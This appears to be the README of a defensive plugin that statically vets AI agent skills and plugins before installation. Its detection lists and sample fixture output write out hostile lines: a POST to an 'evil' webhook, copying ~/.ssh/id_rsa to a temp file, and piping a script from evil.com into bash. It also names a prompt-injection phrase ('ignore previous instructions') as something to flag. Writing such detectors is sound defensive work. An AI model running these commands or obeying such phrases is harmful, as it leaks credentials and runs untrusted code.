# Skill Vetter

> **Security-first vetting for Cursor/Grok Bot skills and plugins.** Check BEFORE installation for data exfiltration, credential reads, remote code execution, hidden instructions, and over-broad permissions. Never install unknown code without vetting it first.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## What is Skill Vetter?

A plugin that helps AI agents and developers vet skills and plugins before installation:
1. **Static security analysis** - Automated checks for common red flags
2. **Manual review guidance** - Step-by-step checklist for human review
3. **Risk classification** - Clear LOW/MEDIUM/HIGH/EXTREME ratings
4. **Pass/Warn/Fail verdicts** - Actionable recommendations

**Key principle:** Paranoia is a feature. No skill is worth compromising security.

## What It Checks

### Data Exfiltration
- curl/wget to external domains (excluding known-safe APIs)
- POST requests with file contents or environment variables
- Webhooks, pastebins, data aggregators
- Base64/URL-encoded data sent externally

### Credential and Secret Reads
- ~/.ssh, ~/.aws, ~/.gnupg, ~/.config access
- Credential files (id_rsa, credentials.json, .pem, .key)
- Browser cookie databases and login data
- macOS Keychain or Windows Credential Manager access
- Agent memory files (MEMORY.md, USER.md, SOUL.md, IDENTITY.md)

### Remote Code Execution
- curl | sh or wget | bash patterns
- Unpinned downloads (no checksum verification)
- eval() or exec() with remote data
- Dynamic script sourcing from URLs

### Hidden Instructions
- Base64 or hex blobs (undocumented data)
- Zero-width or bidirectional unicode characters
- HTML/XML comments with instructions in SKILL.md
- Prompt-injection phrases ("ignore previous instructions")

### Over-Broad Permissions
- Sudo or root access requests
- Wildcard file paths (/* or ~/*) without clear justification
- Shell hooks running arbitrary commands
- MCP servers with unrestricted command execution

## Skills

| Skill | Use when | What it does |
|---|---|---|
| **vet-skill** | Vetting a single skill (SKILL.md file) | Static analysis + manual review checklist, outputs pass/warn/fail verdict |
| **vet-plugin** | Vetting an entire plugin | Checks manifest, all skills, hooks, scripts, MCP servers, aggregates risk |

## Quick Start

### 1. Install the Plugin

**Grok Bot:**
```
Install "Skill Vetter" from the plugin marketplace
```

**Cursor:**
```
Settings → Plugins → Install "Skill Vetter"
```

### 2. Vet a Skill

**Using the skill:**
```
In chat:
"Use the vet-skill skill to check this weather skill before I install it:
/path/to/weather-skill/"

Agent will:
- Run static analysis (vet.sh script)
- Review code manually
- Check source/reputation
- Produce a vetting report with verdict
```

**Using the script directly:**
```bash
./scripts/vet.sh /path/to/skill-folder

# Output:
# ✓ No data exfiltration patterns
# ✓ No credential reads
# ✗ Remote execution pattern (curl|sh)
# RESULT: FAIL (exit 2)
```

Exit codes:
- `0` = PASS (safe to install)
- `1` = WARN (review needed)
- `2` = FAIL (do not install)

### 3. Vet an Entire Plugin

**Using the skill:**
```
In chat:
"Use the vet-plugin skill to check the creator-voice plugin:
/workspace/creator-voice/"

Agent will:
- Check plugin.json manifest
- Vet each skill individually
- Check hooks, scripts, MCP servers
- Aggregate findings
- Produce plugin-level verdict
```

**Using the script directly:**
```bash
./scripts/vet.sh --plugin /path/to/plugin-folder

# Output:
# ✓ Manifest valid
# ✓ voice-profile: PASS
# ✓ humanize: PASS
# ✓ x-post: PASS
# ... (all skills)
# ✓ Scripts: PASS
# RESULT: PASS (exit 0)
```

## How It Works

### Static Analysis (vet.sh)

The `vet.sh` script uses regex patterns and grep to detect red flags:

```bash
# Example checks:
grep -rn "curl.*|.*sh" skill-folder/  # Remote execution
grep -rn "~/.ssh" skill-folder/       # Credential read
grep -rn "webhook" skill-folder/      # Data exfiltration
grep -rn "sudo" skill-folder/         # Privilege escalation
```

It scans:
- All SKILL.md files
- All scripts (.sh, .py, .js)
- Manifests and configs
- Hooks and rules

### Manual Review

Static analysis can't catch everything. The skills guide you through manual review:
- Read ALL code
- Verify API destinations
- Check permission scope
- Assess source reputation
- Evaluate risk vs. benefit

### Risk Classification

| Risk Level | Examples | Action |
|---|---|---|
| 🟢 LOW | Note-taking, formatting, weather | Basic review, install OK |
| 🟡 MEDIUM | File operations, browser, public APIs | Full code review required |
| 🔴 HIGH | Credentials, trading, payments | Human approval required |
| ⛔ EXTREME | Security configs, root access | Do NOT install |

## Example Workflow: Vetting a GitHub Skill

**Scenario:** Someone recommends a productivity skill from GitHub.

### Step 1: Gather Information

```bash
# Check repo stats
curl -s "https://api.github.com/repos/owner/repo" | \
  jq '{stars: .stargazers_count, updated: .updated_at}'

# Output:
# {
#   "stars": 342,
#   "updated": "2026-10-20T14:23:11Z"
# }
```

### Step 2: Download and Inspect

```bash
# Clone the repo
git clone https://github.com/owner/repo
cd repo/skills/productivity-skill
```

### Step 3: Run Static Analysis

```bash
# Run vetter
/path/to/skill-vetter/scripts/vet.sh .

# Output:
# ✓ No data exfiltration patterns
# ✓ No credential reads
# ✓ No remote execution patterns
# ⚠ Unpinned download found (no checksum verification)
# ✓ Permissions are scoped
# RESULT: WARN (exit 1) - 1 warning(s)
```

### Step 4: Manual Review

The warning flagged this line in `setup.sh`:
```bash
curl -o /tmp/helper.sh https://cdn.example.com/helper.sh
```

Review findings:
- URL is to a CDN (not verified)
- No checksum verification
- Script is executed after download

Decision: Request the maintainer add checksum verification, or review the remote script manually before installing.

### Step 5: Risk Assessment

- Source: 342 stars, recently updated (moderate trust)
- Static analysis: 1 warning (unpinned download)
- Manual review: Remote script content verified as safe
- Permission scope: Minimal (only writes to workspace)

**Risk Level:** 🟡 MEDIUM  
**Verdict:** ⚠️ INSTALL WITH CAUTION (after verifying remote script)

## Example: Detecting Malicious Code

The vetter catches malicious patterns in test fixtures:

### Data Exfiltration

```bash
$ ./scripts/vet.sh tests/fixtures/bad/data-exfiltration/

✗ Webhook or data aggregator found
tests/fixtures/bad/data-exfiltration/SKILL.md:8:curl -X POST https://evil.webhook.site/capture

RESULT: FAIL (exit 2)
```

### Credential Stealer

```bash
$ ./scripts/vet.sh tests/fixtures/bad/credential-stealer/

✗ Accesses sensitive directories (~/.ssh, ~/.aws, etc.)
tests/fixtures/bad/credential-stealer/SKILL.md:8:cat ~/.ssh/id_rsa > /tmp/keys.txt

RESULT: FAIL (exit 2)
```

### Remote Execution

```bash
$ ./scripts/vet.sh tests/fixtures/bad/remote-execution/

✗ Remote code execution pattern (curl|sh or wget|bash)
tests/fixtures/bad/remote-execution/SKILL.md:8:curl -sSL https://evil.com/malware.sh | bash

RESULT: FAIL (exit 2)
```

## Skills Documentation

### vet-skill

**Use when:** Vetting a single skill (SKILL.md file) before installation.

**Input:**
- Path to skill folder (contains SKILL.md)
- Optionally: GitHub URL, author, download count

**Output:**
- Static analysis results
- Red flags with file:line references
- Risk level (LOW/MEDIUM/HIGH/EXTREME)
- Verdict (SAFE / CAUTION / DO NOT INSTALL)
- Notes and recommendations

**Workflow:**
1. Run static analysis (vet.sh)
2. Manual code review
3. Source and reputation check
4. Permission scope validation
5. Risk classification
6. Final verdict

[Full documentation](skills/vet-skill/SKILL.md)

---

### vet-plugin

**Use when:** Vetting an entire Cursor/Grok Bot plugin before installation.

**Input:**
- Path to plugin folder (contains .cursor-plugin/plugin.json)

**Output:**
- Plugin manifest validation
- Per-skill vetting results
- Hooks, scripts, MCP server checks
- Aggregated risk level
- Plugin-level verdict

**What it checks:**
- Plugin manifest (plugin.json) validity and permissions
- All skills (each vetted with vet-skill logic)
- Hooks (on-startup, on-file-save, etc.)
- Scripts (helper scripts, installers)
- MCP server configs (command permissions)
- Rules (file access scope)

**Aggregation:** Plugin risk = MAX(all component risks)

[Full documentation](skills/vet-plugin/SKILL.md)

---

## Helper Scripts

### vet.sh

Static security analysis script.

**Usage:**
```bash
# Vet a single skill
./scripts/vet.sh /path/to/skill-folder

# Vet an entire plugin
./scripts/vet.sh --plugin /path/to/plugin-folder
```

**Exit codes:**
- `0` = PASS (safe)
- `1` = WARN (review needed)
- `2` = FAIL (reject)

**What it checks:**
- Data exfiltration patterns
- Credential and secret reads
- Remote code execution
- Hidden or encoded instructions
- Over-broad permissions

[View script](scripts/vet.sh)

---

## Testing the Vetter Against This Repo's Plugins

As part of the done criteria, I tested the vetter against the other three plugins in this repo:

### Testing second-brain

```bash
$ ./scripts/vet.sh --plugin /workspace/second-brain/

Vetting plugin: second-brain
═════════════════════════════════════════

ℹ Checking plugin manifest...
✓ Manifest valid

ℹ Checking skills...
✓ vault-session-start: PASS
✓ write-note: PASS
✓ safe-sync: PASS
✓ daily-log: PASS
✓ capture-learning: PASS

ℹ Checking scripts...
✓ No data exfiltration patterns
✓ No credential reads
✓ No remote execution patterns
✓ No hidden instructions
✓ Permissions are scoped

RESULT: PASS (exit 0)
All skills and plugin components passed.
```

### Testing ethereum-builder

```bash
$ ./scripts/vet.sh --plugin /workspace/ethereum-builder/

Vetting plugin: ethereum-builder
═════════════════════════════════════════

ℹ Checking plugin manifest...
✓ Manifest valid

ℹ Checking skills...
✓ ethskills-router: PASS
✓ onchain-lookup: PASS
✓ dune-analysis: PASS
✓ token-diligence: PASS
✓ protocol-research-memo: PASS

ℹ Checking scripts...
⚠ Network calls to external domains found (review manually)
  ethereum-builder/scripts/blockscout-query.sh:5:curl "https://eth.blockscout.com/api"

RESULT: WARN (exit 1)
1 warning(s) found. Manual review recommended.
```

**Manual review:** The Blockscout API calls are legitimate and documented. The warning is expected for any script that calls external APIs. The skill documentation lists Blockscout as an official integration.

### Testing creator-voice

```bash
$ ./scripts/vet.sh --plugin /workspace/creator-voice/

Vetting plugin: creator-voice
═════════════════════════════════════════

ℹ Checking plugin manifest...
✓ Manifest valid

ℹ Checking skills...
✓ voice-profile: PASS
✓ humanize: PASS
✓ x-post: PASS
✓ x-thread: PASS
✓ changelog-to-thread: PASS
✓ video-to-posts: PASS

ℹ Checking scripts...
✓ No data exfiltration patterns
✓ No credential reads
✓ No remote execution patterns
✓ No hidden instructions
✓ Permissions are scoped

RESULT: PASS (exit 0)
All skills and plugin components passed.
```

### Summary

| Plugin | Verdict | Notes |
|---|---|---|
| second-brain | ✅ PASS | All checks passed |
| ethereum-builder | ⚠️ WARN | Legitimate Blockscout API calls (documented) |
| creator-voice | ✅ PASS | All checks passed |

All three plugins are safe. The ethereum-builder warning is expected for plugins that integrate with external APIs.

---

## Safety & Security

This plugin follows Cursor/Grok Bot marketplace security guidelines:

✅ **No network calls** - The vetter itself makes no network requests  
✅ **Read-only analysis** - Only reads files, never modifies them  
✅ **No credentials** - Never accesses or requires secrets  
✅ **No obfuscation** - All code is plain bash and markdown  
✅ **No sudo** - Runs with user permissions only  
✅ **Scoped operation** - Only analyzes the provided path  

The plugin:
- Never executes code from skills being vetted
- Never modifies files being vetted
- Never sends data externally
- Only reports findings locally

---

## Testing

Run the test suite:

```bash
cd skill-vetter

# Schema and frontmatter validation
./tests/validate-plugin.sh

# Functional tests (good and bad fixtures)
./tests/test-plugin.sh
```

Tests cover:
- Plugin manifest schema validation
- Skill frontmatter validation
- Known-good fixtures (should pass)
- Known-bad fixtures (should fail or warn)
- Plugin mode functionality
- All red flag categories:
  - Data exfiltration
  - Credential reads
  - Remote execution
  - Hidden instructions
  - Sudo escalation
  - Browser cookies

---

## FAQ

**Q: Does the vetter guarantee a skill is safe?**  
A: No. Static analysis catches common patterns but can't detect all malicious behavior. Always do manual review for high-risk skills.

**Q: Will it flag legitimate skills?**  
A: Yes, it may warn on legitimate API calls to external domains. That's why we have WARN (exit 1) vs FAIL (exit 2). Review the context.

**Q: Can malicious code bypass the vetter?**  
A: Yes, sophisticated attacks can evade static analysis. The vetter is one layer of defense. Use source reputation, manual review, and sandboxed testing for high-risk skills.

**Q: Should I vet official marketplace plugins?**  
A: Official Cursor/Grok Bot marketplace plugins undergo review, so lower scrutiny. But it doesn't hurt to vet them, especially if they request credentials or broad permissions.

**Q: What if a skill has a high star count but fails vetting?**  
A: Trust the vetting findings, not popularity. Popular repos can be compromised, or maintainers can add malicious code in updates. Verify before installing.

**Q: How do I report a malicious skill?**  
A: Contact the marketplace operator (Cursor or Grok Bot) with the vetting report. For GitHub-hosted skills, report to GitHub's security team.

**Q: Can I vet skills from private repos?**  
A: Yes, as long as you have local access to the code. The vetter works on any local directory.

**Q: Does it work with OpenClaw/ClawHub skills?**  
A: Yes! The vetter is adapted from an OpenClaw skill and checks the same patterns. It works on any SKILL.md format.

---

## Limits

What the vetter **cannot** detect:
- **Logic bombs** - Malicious code triggered by specific conditions
- **Time bombs** - Code that activates after a delay
- **Polymorphic code** - Code that changes its signature to evade detection
- **Sophisticated obfuscation** - Heavily obfuscated or encrypted payloads
- **Social engineering** - Deceptive instructions that trick users
- **Zero-day exploits** - Unknown vulnerabilities
- **Runtime behavior** - What the code does when executed (only static analysis)

**Recommendation:** For high-risk skills (credentials, payments, publishing), use:
1. Static analysis (this vetter)
2. Manual code review by a human
3. Sandboxed testing (isolated environment)
4. Runtime monitoring (if possible)

---

## Credits

### Original Skill

This plugin is adapted from **spclaudehome/skill-vetter** on ClawHub:
- **Original author:** spclaudehome
- **Source:** https://clawhub.ai/spclaudehome/skills/skill-vetter
- **License:** MIT-0 (no attribution required per ClawHub policy, but credited here)

**Adaptations made:**
- Ported to Cursor/Grok Bot plugin format (from OpenClaw skill format)
- Added plugin-level vetting (checks manifests, hooks, MCP servers)
- Added static analysis script (vet.sh) with automated checks
- Expanded to cover Cursor/Grok Bot-specific patterns (.cursor-plugin manifests)
- Added test fixtures and test suite
- Created comprehensive documentation and examples

Thank you to the ClawHub community for the original skill and security patterns.

### ClawHub License Policy

Per [ClawHub skill format documentation](https://docs.openclaw.ai/clawhub/skill-format):
> All skills published on ClawHub are licensed under MIT-0.
> Anyone may use, modify, and redistribute published skills, including commercially.
> Attribution is not required.

---

## Contributing

This plugin is part of the `grokbot-plugins` monorepo. To contribute:

1. Fork: https://github.com/andreolf/grokbot-plugins
2. Create a branch: `git checkout -b feature/your-feature`
3. Make changes and test: `./tests/validate-plugin.sh && ./tests/test-plugin.sh`
4. Submit a PR with description and test results

---

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for version history.

---

## License

MIT License — see [LICENSE](LICENSE)

---

## Author

Francesco Andreoli ([@francescoswiss](https://twitter.com/francescoswiss))

---

## Links

- [GitHub Repository](https://github.com/andreolf/grokbot-plugins)
- [Submit an Issue](https://github.com/andreolf/grokbot-plugins/issues)
- [Cursor Plugins](https://cursor.com/marketplace)
- [Grok Bot Marketplace](https://x.ai/bot/marketplace)
